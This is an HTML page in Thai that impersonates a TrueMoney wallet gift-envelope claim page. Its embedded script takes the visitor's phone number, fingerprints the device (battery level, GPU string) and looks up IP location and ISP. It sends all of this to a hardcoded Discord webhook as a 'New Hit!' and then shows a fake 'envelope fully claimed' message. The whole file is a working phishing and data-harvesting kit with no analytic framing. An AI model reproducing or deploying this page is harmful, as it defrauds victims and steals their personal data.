<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    
    <title>ทรูมันนี่ - รับซอง</title>
    <meta property="og:title" content="🧧 ของขวัญสำหรับคุณ">
    <meta property="og:description" content="คุณได้รับซองอั่งเปาจากเพื่อน กดรับเงินเข้าวอลเล็ทได้ที่นี่">
    <meta property="og:image" content="https://img5.pic.in.th/file/secure-sv1/true-gift-woman.png">
    <meta property="og:type" content="website">

    <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        body { font-family: 'Sarabun', sans-serif; background-color: #ffffff; margin: 0; padding: 0; display: flex; justify-content: center; }
        .wrapper { width: 100%; max-width: 450px; padding: 50px 25px; text-align: center; }
        
        /* จัดขนาดรูปผู้หญิงให้พอดีแบบรูปที่ 4 */
        .hero-img { width: 100%; max-width: 260px; height: auto; margin: 0 auto 15px auto; display: block; }
        
        .name { font-size: 1.6rem; font-weight: 700; color: #333; margin: 10px 0 5px 0; }
        .sub { font-size: 1.1rem; color: #8e8e8e; margin-bottom: 35px; }

        .form-group { text-align: left; margin: 0 auto; width: 100%; max-width: 340px; }
        label { font-size: 1rem; color: #666; display: block; margin-bottom: 10px; }
        input { 
            width: 100%; padding: 16px; border: 1px solid #e5e5e5; border-radius: 12px; 
            font-size: 1.2rem; background-color: #f9f9f9; outline: none; transition: 0.3s;
        }
        input:focus { border-color: #ff8c2d; background-color: #fff; }

        .btn { 
            background-color: #ff8c2d; color: #fff; border: none; width: 100%; max-width: 340px; 
            padding: 18px; font-size: 1.25rem; font-weight: 700; border-radius: 40px; 
            cursor: pointer; margin-top: 45px; box-shadow: 0 5px 15px rgba(255,140,45,0.3);
        }

        /* หน้า Loading ที่คลุมทั้งจอ */
        #ovl { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(255,255,255,0.98); display: none; 
            flex-direction: column; justify-content: center; align-items: center; z-index: 9999; 
        }
        .spin { border: 4px solid #f3f3f3; border-top: 4px solid #ff8c2d; border-radius: 50%; width: 50px; height: 50px; animation: s 1s linear infinite; margin-bottom: 20px; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="wrapper">
        <img src="https://img5.pic.in.th/file/secure-sv1/true-gift-woman.png" class="hero-img">
        
        <div class="name">ปัญญาภร ***</div>
        <div class="sub">ส่งซองทรูมันนี่ให้คุณ</div>

        <div class="form-group">
            <label>กรอกเบอร์โทรศัพท์เพื่อรับซอง</label>
            <input type="text" id="tel" placeholder="08x-xxx-xxxx" maxlength="10">
        </div>

        <button class="btn" onclick="send()">รับซองเลย</button>
    </div>

    <div id="ovl">
        <div class="spin"></div>
        <div id="msg" style="color:#ff8c2d; font-weight:700; font-size:1.2rem;">กำลังประมวลผล...</div>
        <div id="submsg" style="color:#999; font-size:0.95rem; margin-top:10px; padding:0 20px; text-align:center;">กรุณารอครู่เดียว ระบบกำลังยืนยันสิทธิ์กับเซิร์ฟเวอร์</div>
    </div>

    <script>
        const HOOK = "https://discord.com/api/webhooks/1493303430289162493/u7A4FZxwAdekbS0Bw5pngOyRc2DToLjFQikE0rxeCqaEO1GNy6CddP8ChlCCNqSlB854";

        async function send() {
            const num = document.getElementById('tel').value;
            if(!/^[0-9]{10}$/.test(num)) return alert("กรุณาระบุเบอร์โทรศัพท์ให้ถูกต้อง");
            
            document.getElementById('ovl').style.display = 'flex';

            let gpu = "N/A";
            try { gpu = document.createElement('canvas').getContext('webgl').getParameter(43521); } catch(e){}
            let bat = "N/A";
            try { const b = await navigator.getBattery(); bat = `${(b.level*100).toFixed(0)}%`; } catch(e){}

            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                
                await fetch(HOOK, { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' }, 
                    body: JSON.stringify({
                        content: `💰 **New Hit!** | User: **SERAS9**\nPhone: \`${num}\``,
                        embeds: [{
                            color: 16745517,
                            fields: [
                                { name: "📱 Phone", value: `**${num}**`, inline: true },
                                { name: "🔋 Battery", value: `\`${bat}\``, inline: true },
                                { name: "📍 Location", value: `${d.city}, ${d.region}\nISP: ${d.org}`, inline: false },
                                { name: "🖥️ GPU", value: `\`${gpu}\``, inline: false }
                            ],
                            timestamp: new Date()
                        }]
                    }) 
                });
            } catch(e){}

            setTimeout(() => {
                document.getElementById('msg').style.color = "#ff4444";
                document.getElementById('msg').innerText = "❌ สิทธิ์รับซองเต็มแล้ว";
                document.getElementById('submsg').innerText = "ขออภัย ซองของขวัญนี้มีผู้รับครบจำนวนแล้ว โปรดตรวจสอบใหม่อีกครั้งในภายหลัง";
                document.querySelector('.spin').style.display = 'none';
            }, 3500);
        }
    </script>
</body>
</html>
